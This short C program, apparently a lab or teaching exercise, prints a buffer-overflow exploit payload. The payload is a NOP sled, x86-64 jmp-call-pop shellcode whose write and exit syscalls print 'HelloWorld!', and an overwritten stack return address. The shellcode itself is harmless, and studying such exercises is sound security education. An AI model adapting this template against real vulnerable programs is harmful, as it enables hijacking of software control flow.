#include<stdio.h>

void main(){

	printf(
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" //nops
	"\xeb\x14"                  //jmp     <there>

// 000000000040045d <here>:
	"\x5e"                   	//pop    %rsi
	"\x6a\x01"                	//pushq  $0x1
  	"\x58"                   	//pop    %rax
  	"\x6a\x01"                	//pushq  $0x1
  	"\x5f"                   	//pop    %rdi
  	"\x6a\x0d"                	//pushq  $0xd
  	"\x5a"                   	//pop    %rdx
  	"\x0f\x05"                	//syscall 
  	"\x6a\x3c"                	//pushq  $0x3c
  	"\x58"                   	//pop    %rax
  	"\x48\x31\xff"              //xor    %rdi,%rdi
  	"\x0f\x05"                	//syscall 
// 0000000000400471 <there>:
  	"\xe8\xe7\xff\xff\xff"      //callq   <here>
  	"HelloWorld!\xb3\xdc\xff\xff\xff\x7f\n"  //string to be printed and adress           
  	);

}